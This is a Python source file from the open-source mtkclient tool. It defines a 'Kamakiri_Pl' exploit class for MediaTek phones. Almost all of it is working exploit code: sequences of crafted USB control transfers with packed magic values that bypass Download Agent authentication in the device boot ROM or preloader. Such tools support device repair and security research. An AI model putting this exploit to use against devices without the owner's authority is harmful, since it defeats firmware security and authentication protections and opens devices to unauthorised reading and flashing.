#!/usr/bin/python3
# -*- coding: utf-8 -*-
# (c) B.Kerler 2018-2023 GPLv3 License
import logging
import array
from struct import pack

from mtkclient.Library.exploit_handler import Exploitation
from mtkclient.Library.utils import LogBase
from mtkclient.Library.Connection.usblib import usb


class Kamakiri_Pl(Exploitation, metaclass=LogBase):

    def __init__(self, mtk, loglevel=logging.INFO):
        super().__init__(mtk, loglevel)
        self.linecode = None

    def initbrom(self):
        # bypass1stda
        for i in range(5):
            getVal = self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0xa1,
                                                            bRequest=0x21,
                                                            wValue=0,
                                                            wIndex=0,
                                                            data_or_wLength=7)
        data = pack("<Q", 0x800000001C200)
        self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x21,
                                               bRequest=0x20,
                                               wValue=0,
                                               wIndex=0,
                                               data_or_wLength=array.array('B', data))
        for i in range(2):
            self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x21,
                                                   bRequest=0x22,
                                                   wValue=0x3,
                                                   wIndex=0,
                                                   data_or_wLength=0)

        getVal = self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0xa1,
                                                        bRequest=0x21,
                                                        wValue=0,
                                                        wIndex=0,
                                                        data_or_wLength=7)

        self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x21,
                                               bRequest=0x20,
                                               wValue=0,
                                               wIndex=0,
                                               data_or_wLength=getVal)

        self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x21,
                                               bRequest=0x23,
                                               wValue=0,
                                               wIndex=0,
                                               data_or_wLength=0)

        for i in range(2):
            self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x21,
                                                   bRequest=0x22,
                                                   wValue=0x3,
                                                   wIndex=0,
                                                   data_or_wLength=0)

    def bypass2ndDA(self):
        usb.util.claim_interface(self.mtk.port.cdc.device, 0)
        try:
            # ret =
            self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x80,
                                                   bRequest=0x6,
                                                   wValue=0x02FF,
                                                   wIndex=0xFFFF,
                                                   data_or_wLength=9)
        except Exception:
            pass
        try:
            # value =
            self.mtk.port.cdc.device.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
        except Exception:
            pass

        data = pack("<QI", 0x800000001C200, 0x22C3B0)
        try:
            self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x21,
                                                   bRequest=0x20,
                                                   wValue=0,
                                                   wIndex=0,
                                                   data_or_wLength=array.array('B', data))
        except Exception:
            pass
        try:
            # ret =
            self.mtk.port.cdc.device.ctrl_transfer(bmRequestType=0x80,
                                                   bRequest=0x6,
                                                   wValue=0x02FF,
                                                   wIndex=0xFFFF,
                                                   data_or_wLength=9)
        except Exception:
            pass
